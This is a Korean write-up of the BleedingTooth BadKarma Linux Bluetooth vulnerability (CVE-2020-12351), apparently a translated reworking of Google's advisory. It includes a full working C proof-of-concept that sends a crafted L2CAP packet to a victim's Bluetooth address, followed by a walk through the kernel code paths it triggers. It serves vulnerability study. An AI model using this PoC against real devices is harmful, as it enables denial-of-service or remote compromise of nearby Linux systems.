# BleedingTooth - BadKarma
본 문서는 구글 보안팀의 [BadKarma 공식 문서](https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq)를 번역하며 재구성한 글입니다.


## Abstract
```
CVE: CVE-2020-12351
Severity: High
Platform: Linux Kernel >= 4.8
Attack Type: Heap-Based Type Confusion
```
본 글에서 다룰 취약점은 BleedingTooth 취약점 중 BadKarma 공격에 대한 내용으로 `CVE-2020-12351`번을 부여받은 취약점이다. 리눅스 커널 4.8 버전 이상에서 적용되며, [dbb50887c8f61 커밋](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/bluetooth/l2cap_core.c?id=dbb50887c8f619fc5c3489783ebc3122bc134a31)에서 발생했다. 취약점이 발생한 위치는 `net/bluetooth/l2cap_core.c` 파일이다.

공격자는 피해자의 bd 주소만 알고 있어도 단거리에서 조작된 l2cap 패킷을 보내 DoS 공격을 유발하거나 RCE가 가능하다.

## Proof Of Concept
### poc.c
```c++
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#define AMP_MGR_CID 0x03

static uint16_t crc16_tab[256] = {
  0x0000, 0xc0c1, 0xc181, 0x0140, 0xc301, 0x03c0, 0x0280, 0xc241,
  0xc601, 0x06c0, 0x0780, 0xc741, 0x0500, 0xc5c1, 0xc481, 0x0440,
  0xcc01, 0x0cc0, 0x0d80, 0xcd41, 0x0f00, 0xcfc1, 0xce81, 0x0e40,
  0x0a00, 0xcac1, 0xcb81, 0x0b40, 0xc901, 0x09c0, 0x0880, 0xc841,
  0xd801, 0x18c0, 0x1980, 0xd941, 0x1b00, 0xdbc1, 0xda81, 0x1a40,
  0x1e00, 0xdec1, 0xdf81, 0x1f40, 0xdd01, 0x1dc0, 0x1c80, 0xdc41,
  0x1400, 0xd4c1, 0xd581, 0x1540, 0xd701, 0x17c0, 0x1680, 0xd641,
  0xd201, 0x12c0, 0x1380, 0xd341, 0x1100, 0xd1c1, 0xd081, 0x1040,
  0xf001, 0x30c0, 0x3180, 0xf141, 0x3300, 0xf3c1, 0xf281, 0x3240,
  0x3600, 0xf6c1, 0xf781, 0x3740, 0xf501, 0x35c0, 0x3480, 0xf441,
  0x3c00, 0xfcc1, 0xfd81, 0x3d40, 0xff01, 0x3fc0, 0x3e80, 0xfe41,
  0xfa01, 0x3ac0, 0x3b80, 0xfb41, 0x3900, 0xf9c1, 0xf881, 0x3840,
  0x2800, 0xe8c1, 0xe981, 0x2940, 0xeb01, 0x2bc0, 0x2a80, 0xea41,
  0xee01, 0x2ec0, 0x2f80, 0xef41, 0x2d00, 0xedc1, 0xec81, 0x2c40,
  0xe401, 0x24c0, 0x2580, 0xe541, 0x2700, 0xe7c1, 0xe681, 0x2640,
  0x2200, 0xe2c1, 0xe381, 0x2340, 0xe101, 0x21c0, 0x2080, 0xe041,
  0xa001, 0x60c0, 0x6180, 0xa141, 0x6300, 0xa3c1, 0xa281, 0x6240,
  0x6600, 0xa6c1, 0xa781, 0x6740, 0xa501, 0x65c0, 0x6480, 0xa441,
  0x6c00, 0xacc1, 0xad81, 0x6d40, 0xaf01, 0x6fc0, 0x6e80, 0xae41,
  0xaa01, 0x6ac0, 0x6b80, 0xab41, 0x6900, 0xa9c1, 0xa881, 0x6840,
  0x7800, 0xb8c1, 0xb981, 0x7940, 0xbb01, 0x7bc0, 0x7a80, 0xba41,
  0xbe01, 0x7ec0, 0x7f80, 0xbf41, 0x7d00, 0xbdc1, 0xbc81, 0x7c40,
  0xb401, 0x74c0, 0x7580, 0xb541, 0x7700, 0xb7c1, 0xb681, 0x7640,
  0x7200, 0xb2c1, 0xb381, 0x7340, 0xb101, 0x71c0, 0x7080, 0xb041,
  0x5000, 0x90c1, 0x9181, 0x5140, 0x9301, 0x53c0, 0x5280, 0x9241,
  0x9601, 0x56c0, 0x5780, 0x9741, 0x5500, 0x95c1, 0x9481, 0x5440,
  0x9c01, 0x5cc0, 0x5d80, 0x9d41, 0x5f00, 0x9fc1, 0x9e81, 0x5e40,
  0x5a00, 0x9ac1, 0x9b81, 0x5b40, 0x9901, 0x59c0, 0x5880, 0x9841,
  0x8801, 0x48c0, 0x4980, 0x8941, 0x4b00, 0x8bc1, 0x8a81, 0x4a40,
  0x4e00, 0x8ec1, 0x8f81, 0x4f40, 0x8d01, 0x4dc0, 0x4c80, 0x8c41,
  0x4400, 0x84c1, 0x8581, 0x4540, 0x8701, 0x47c0, 0x4680, 0x8641,
  0x8201, 0x42c0, 0x4380, 0x8341, 0x4100, 0x81c1, 0x8081, 0x4040
};

uint16_t crc16(uint16_t crc, const void *buf, size_t size) {
  const uint8_t *p;

  p = buf;

  while (size--)
    crc = crc16_tab[(crc ^ (*p++)) & 0xFF] ^ (crc >> 8);

  return crc;
}

int hci_send_acl_data(int hci_socket, uint16_t hci_handle, void *data, uint16_t data_length) {
  uint8_t type = HCI_ACLDATA_PKT;
  uint16_t BCflag = 0x0000;
  uint16_t PBflag = 0x0002;
  uint16_t flags = ((BCflag << 2) | PBflag) & 0x000F;

  hci_acl_hdr hdr;
  hdr.handle = htobs(acl_handle_pack(hci_handle, flags));
  hdr.dlen = data_length;

  struct iovec iv[3];

  iv[0].iov_base = &type;
  iv[0].iov_len = 1;
  iv[1].iov_base = &hdr;
  iv[1].iov_len = HCI_ACL_HDR_SIZE;
  iv[2].iov_base = data;
  iv[2].iov_len = data_length;

  return writev(hci_socket, iv, sizeof(iv) / sizeof(struct iovec));
}

int main(int argc, char **argv) {
  if (argc != 2) {
    printf("Usage: %s MAC_ADDR\n", argv[0]);
    return 1;
  }

  bdaddr_t dst_addr;
  str2ba(argv[1], &dst_addr);

  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");

  printf("[*] Opening hci device...\n");
  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);
  int hci_socket = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  }

  struct hci_filter flt;
  hci_filter_clear(&flt);
  hci_filter_all_ptypes(&flt);
  hci_filter_all_events(&flt);
  if (setsockopt(hci_socket, SOL_HCI, HCI_FILTER, &flt, sizeof(flt)) < 0) {
    perror("setsockopt(HCI_FILTER)");
    return 1;
  }

  int opt = 1;
  if (setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt)) < 0) {
    perror("setsockopt(HCI_DATA_DIR)");
    return 1;
  }

  printf("[*] Connecting to victim...\n");

  struct sockaddr_l2 laddr = {0};
  laddr.l2_family = AF_BLUETOOTH;
  laddr.l2_bdaddr = di.bdaddr;

  struct sockaddr_l2 raddr = {0};
  raddr.l2_family = AF_BLUETOOTH;
  raddr.l2_bdaddr = dst_addr;

  int l2_sock;

  if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
    perror("socket");
    return 1;
  }

  if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
    perror("bind");
    return 1;
  }

  if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
    perror("connect");
    return 1;
  }

  struct l2cap_conninfo l2_conninfo;
  socklen_t l2_conninfolen = sizeof(l2_conninfo);
  if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen) < 0) {
    perror("getsockopt");
    return 1;
  }

  uint16_t hci_handle = l2_conninfo.hci_handle;
  printf("[+] HCI handle: %x\n", hci_handle);

  printf("[*] Sending malicious L2CAP packet...\n");
  struct {
    l2cap_hdr hdr;
    uint16_t ctrl;
    uint16_t fcs;
  } packet = {0};
  packet.hdr.len = htobs(sizeof(packet) - L2CAP_HDR_SIZE);
  packet.hdr.cid = htobs(AMP_MGR_CID);
  packet.fcs = crc16(0, &packet, sizeof(packet) - 2);
  hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));

  close(l2_sock);
  hci_close_dev(hci_socket);

  return 0;
}
```

## Analysis #1 핵심
본 취약점의 핵심은 type confusion이다. 다음 코드를 살펴보자.
```c++
static int l2cap_data_rcv(struct l2cap_chan *chan, struct sk_buff *skb)
{
	struct l2cap_ctrl *control = &bt_cb(skb)->l2cap;
	u16 len;
	u8 event;

	// ...

	if ((chan->mode == L2CAP_MODE_ERTM ||
	     chan->mode == L2CAP_MODE_STREAMING) && sk_filter(chan->data, skb))
		goto drop;

	// ...
}
```
`l2cap_data_rcv()` 함수는 인자로 `l2cap_chan` 구조체 자료형의 chan 변수를 전달받는다. 그러나 함수 내부에서 `sk_filter()` 함수의 첫 번째 인자로 `chan->data`를 넘기는데, 이 부분에서 type confusion이 발생한다.

`sk_filter()` 함수는 다음과 같다.
```c++
int sk_filter(struct sock *sk, struct sk_buff *skb);
```
sock 구조체를 사용함을 알 수 있다. 그렇다면 l2cap_chan의 data 필드는 어떤 자료형으로 선언되어 있을까?

```c++
struct l2cap_chan {
	struct l2cap_conn	*conn;
	struct hci_conn		*hs_hcon;
	struct hci_chan		*hs_hchan;
	struct kref	kref;
	atomic_t	nesting;

    // ...

	void			*data;
	const struct l2cap_ops	*ops;
	struct mutex		lock;
};
```
위 코드는 `l2cap_chan` 구조체의 일부 [코드](https://code.woboq.org/linux/linux/include/net/bluetooth/l2cap.h.html#l2cap_chan)이다. 위 코드를 통해 data는 void 형으로 선언되어있는 것을 확인할 수 있다. data의 확장성 때문에 void 형으로 선언했을 것으로 추측된다.

## Analysis #2 트리거 - L2CAP_MODE_ERTM
취약점이 발생하는 로직으로 가기 위해 어떻게 패킷을 구성해야하는지 알아보아야 한다. 가장 근본적인 코드부터 살펴보자.
```c++
static int l2cap_data_rcv(struct l2cap_chan *chan, struct sk_buff *skb)
{
    struct l2cap_ctrl *control = &bt_cb(skb)->l2cap;
    u16 len;
    u8 event;

    __unpack_control(chan, skb);

	len = skb->len;

    if (l2cap_check_fcs(chan, skb))         // 체크섬 검사
        goto drop;

    if (!control->sframe && control->sar == L2CAP_SAR_START)
        len -= L2CAP_SDULEN_SIZE;

    if (chan->fcs == L2CAP_FCS_CRC16)
        len -= L2CAP_FCS_SIZE;

    if (len > chan->mps) {
        l2cap_send_disconn_req(chan, ECONNRESET);
        goto drop;
    }

    if ((chan->mode == L2CAP_MODE_ERTM ||
            chan->mode == L2CAP_MODE_STREAMING) && sk_filter(chan->data, skb)) // 취약한 부분
        goto drop;

    // ...
}
```
체크섬 검사가 통과되면, `chan->mode`가 `L2CAP_MODE_ERTM` 또는 `L2CAP_MODE_STREAMING` 중 하나에 해당되면 취약한 코드가 트리거된다. 두 매크로는 `l2cap.h`에 각각 `0x03`, `0x04`로 선언되어있다. `l2cap_data_rcv()`의 호출부를 보면 아래와 같이 동일한 조건을 검사하는 것을 확인할 수 있다.
```c++
static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid,
			       struct sk_buff *skb)
{
	struct l2cap_chan *chan;
	chan = l2cap_get_chan_by_scid(conn, cid);
	if (!chan) {
		if (cid == L2CAP_CID_A2MP) {
			chan = a2mp_channel_create(conn, skb);  // chan 변수 재설정
			if (!chan) {
				kfree_skb(skb);
				return;
			}
			l2cap_chan_lock(chan);
		} else {
			BT_DBG("unknown cid 0x%4.4x", cid);
			/* Drop packet and return */
			kfree_skb(skb);
			return;
		}
	}
	BT_DBG("chan %p, len %d", chan, skb->len);
	/* If we receive data on a fixed channel before the info req/rsp
	 * procdure is done simply assume that the channel is supported
	 * and mark it as ready.
	 */
	if (chan->chan_type == L2CAP_CHAN_FIXED)
		l2cap_chan_ready(chan);
	if (chan->state != BT_CONNECTED)
		goto drop;
	switch (chan->mode) {
	
    // ...

	case L2CAP_MODE_ERTM:
	case L2CAP_MODE_STREAMING:
		l2cap_data_rcv(chan, skb);  // 취약한 함수 호출부
		goto done;
	default:
		BT_DBG("chan %p: bad mode 0x%2.2x", chan, chan->mode);
		break;
	}

drop:
	kfree_skb(skb);
done:
	l2cap_chan_unlock(chan);
}
```
위 함수에서도 switch문을 통해 `chan->mode`가 `L2CAP_MODE_ERTM` 또는 `L2CAP_MODE_STREAMING` 인지 검사한다. 그렇다면 `chan->mode`는 어디서 설정하고, 우리가 원하는 mode로 어떻게 바꿀 수 있을까? 위 코드 상단부를 살펴보면 인자로 받은 `cid` 값이 `L2CAP_CID_A2MP`와 같다면 `a2mp_channel_create()` 함수를 실행하여 주요 변수인 `chan`을 수정하는 것을 확인할 수 있다. `a2mp_channel_create()` 함수는 다음과 같다.
```c++
struct l2cap_chan *a2mp_channel_create(struct l2cap_conn *conn,
				       struct sk_buff *skb)
{
	struct amp_mgr *mgr;
	if (conn->hcon->type != ACL_LINK)
		return NULL;
	mgr = amp_mgr_create(conn, false); // mgr 생성 함수
	if (!mgr) {
		BT_ERR("Could not create AMP manager");
		return NULL;
	}
	BT_DBG("mgr: %p chan %p", mgr, mgr->a2mp_chan);
	return mgr->a2mp_chan;
}
```
최종적으로 `mgr->a2mp_chan`을 반환하는 것을 알 수 있다. 또한 type confusion을 발생시키는 변수인 `chan->data`에 mgr 데이터가 대입되는 것을 확인할 수 있다. 즉, 해당 변수는 `sock` 자료형이 아니라 `amp_mgr` 자료형으로 선언되었다. 이 mgr 변수는 `amp_mgr_create()` 함수에 의해 생성된다. 이 함수도 살펴보자.
```c++
static struct amp_mgr *amp_mgr_create(struct l2cap_conn *conn, bool locked)
{
	struct amp_mgr *mgr;
	struct l2cap_chan *chan;
	mgr = kzalloc(sizeof(*mgr), GFP_KERNEL);
	if (!mgr)
		return NULL;
	BT_DBG("conn %p mgr %p", conn, mgr);
	mgr->l2cap_conn = conn;
	chan = a2mp_chan_open(conn, locked); // chan 생성부
	if (!chan) {
		kfree(mgr);
		return NULL;
	}
	mgr->a2mp_chan = chan; // a2mp_chan 필드 설정 부분
	chan->data = mgr;
	conn->hcon->amp_mgr = mgr;
	kref_init(&mgr->kref);
	/* Remote AMP ctrl list initialization */
	INIT_LIST_HEAD(&mgr->amp_ctrls);
	mutex_init(&mgr->amp_ctrls_lock);
	mutex_lock(&amp_mgr_list_lock);
	list_add(&mgr->list, &amp_mgr_list);
	mutex_unlock(&amp_mgr_list_lock);
	return mgr; 
}
```
`amp_mgr_create()` 함수는 최종적으로 mgr을 반환한다. mgr을 구성하는 과정에서 `a2mp_chan` 필드를 설정하는 부분을 확인할 수 있는데, chan 변수를 넣는 것을 볼 수 있다. 이 chan 변수는 상단부에 `a2mp_chan_open()` 함수로 생성된다. 해당 함수는 아래와 같다.
```c++
static struct l2cap_chan *a2mp_chan_open(struct l2cap_conn *conn, bool locked)
{
	struct l2cap_chan *chan;
	int err;
	chan = l2cap_chan_create();
	
    // ...

	chan->mode = L2CAP_MODE_ERTM;
	
    // ...

	return chan;
}
```
드디어 우리가 원하는 그림이 나왔다. chan 데이터를 최종 반환하는 함수이며, mode 필드를 설정하는 것을 확인할 수 있는데, 우리가 필요로 하는 `L2CAP_MODE_ERTM` 값으로 설정되는 것을 확인할 수 있다.

## Analysis #3 트리거 - l2cap_data_channel()
현재까지 분석한 내용 중 가장 상위 함수부터 다시 살펴보자.
```c++
static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid,
			       struct sk_buff *skb)
{
	struct l2cap_chan *chan;
	chan = l2cap_get_chan_by_scid(conn, cid);
	if (!chan) {
		if (cid == L2CAP_CID_A2MP) {
			chan = a2mp_channel_create(conn, skb);  // chan 변수 재설정
			if (!chan) {
				kfree_skb(skb);
				return;
			}
			l2cap_chan_lock(chan);
		} else {
			BT_DBG("unknown cid 0x%4.4x", cid);
			/* Drop packet and return */
			kfree_skb(skb);
			return;
		}
	}
	BT_DBG("chan %p, len %d", chan, skb->len);
	/* If we receive data on a fixed channel before the info req/rsp
	 * procdure is done simply assume that the channel is supported
	 * and mark it as ready.
	 */
	if (chan->chan_type == L2CAP_CHAN_FIXED)
		l2cap_chan_ready(chan);
	if (chan->state != BT_CONNECTED)
		goto drop;
	switch (chan->mode) {
	
    // ...

	case L2CAP_MODE_ERTM:
	case L2CAP_MODE_STREAMING:
		l2cap_data_rcv(chan, skb);  // 취약한 함수 호출부
		goto done;
	default:
		BT_DBG("chan %p: bad mode 0x%2.2x", chan, chan->mode);
		break;
	}

drop:
	kfree_skb(skb);
done:
	l2cap_chan_unlock(chan);
}
```
취약한 함수 호출부가 존재하고, 그 조건을 맞추기 위해서는 체크섬을 먼저 통과해야하고, `chan->mode`가 `L2CAP_MODE_ERTM(0x03)` 또는 `L2CAP_MODE_STREAMING(0x04)` 이어야만 했다. 그 조건은 인자로 받은 `cid`가 `L2CAP_CID_A2MP(0x03)`와 같을 경우 실행되는 `a2mp_channel_create()` 함수가 실행되면 기본적으로 `L2CAP_MODE_ERTM` mode가 설정된다. 1차적인 조건은 맞출 수 있게 되었다. 이제 분석한 `l2cap_data_channel()` 함수로 흐름을 조작하기 위해 더 상단의 함수들로 나가보자.
```c++
static void l2cap_recv_frame(struct l2cap_conn *conn, struct sk_buff *skb)
{
	struct l2cap_hdr *lh = (void *) skb->data;
	struct hci_conn *hcon = conn->hcon;
	u16 cid, len;
	__le16 psm;
	if (hcon->state != BT_CONNECTED) {
		BT_DBG("queueing pending rx skb");
		skb_queue_tail(&conn->pending_rx, skb);
		return;
	}
	skb_pull(skb, L2CAP_HDR_SIZE);
	cid = __le16_to_cpu(lh->cid);
	
    // ...

	switch (cid) {
	case L2CAP_CID_SIGNALING:               // l2cap.h 파일에 0x0001 로 선언
		l2cap_sig_channel(conn, skb);
		break;
	case L2CAP_CID_CONN_LESS:               // l2cap.h 파일에 0x0002 로 선언
		psm = get_unaligned((__le16 *) skb->data);
		skb_pull(skb, L2CAP_PSMLEN_SIZE);
		l2cap_conless_channel(conn, psm, skb);
		break;
	case L2CAP_CID_LE_SIGNALING:            // l2cap.h 파일에 0x0005 로 선언
		l2cap_le_sig_channel(conn, skb);
		break;
	default:
		l2cap_data_channel(conn, cid, skb); // 취약한 로직이 존재하는 상위함수
		break;
	}
}
```
`l2cap_recv_frame` 함수는 `l2cap_recv_acldata()` 함수에서 정상적으로 패킷을 수신했을 경우 실행되는 함수다. 즉, 본 로직을 처리하는 초기 부분이라고 볼 수 있다. 취약한 로직으로 흐름을 유도하기 위해서는 switch문에서 `cid` 값이 3가지 조건에 만족하지 않아야 한다. `L2CAP_CID_SIGNALING(0x0001)`, `L2CAP_CID_CONN_LESS(0x0002)`, `L2CAP_CID_LE_SIGNALING(0x0005)` 이 그 조건이다. 앞서 우리는 chan을 생성하는 함수를 실행하기 위해 cid가 3이 되는 조건을 만족해야하기 때문에 cid 값만 3으로 잘 설정해준다면 위 switch 문도 어렵지 않게 통과할 수 있다.

## Analysis #4 exploit
exploit 코드가 우리가 분석한 내용과 일치하는 구조로 구성되어있는지 확인해보자. 소켓 설정 및 초기 bluetooth 연결부는 생략했다.
```c++
#define AMP_MGR_CID 0x03

// ...

int main(int argc, char **argv) {
  
  // ...

  printf("[*] Connecting to victim...\n");

  // ...

  uint16_t hci_handle = l2_conninfo.hci_handle;
  printf("[+] HCI handle: %x\n", hci_handle);

  printf("[*] Sending malicious L2CAP packet...\n");
  struct {
    l2cap_hdr hdr;
    uint16_t ctrl;
    uint16_t fcs;
  } packet = {0};
  packet.hdr.len = htobs(sizeof(packet) - L2CAP_HDR_SIZE);
  packet.hdr.cid = htobs(AMP_MGR_CID);
  packet.fcs = crc16(0, &packet, sizeof(packet) - 2);
  hci_send_acl_data(hci_socket, hci_handle, &packet, sizeof(packet));

  close(l2_sock);
  hci_close_dev(hci_socket);

  return 0;
}
```
취약한 로직으로 분기하기 위해 `hdr.cid`를 `0x3`으로 설정하는 것을 확인할 수 있다. 체크섬 통과를 위한 `fcs` 필드도 설정했기 때문에 중간에 `goto drop`으로 분기되지 않고 성공적으로 트리거할 수 있다.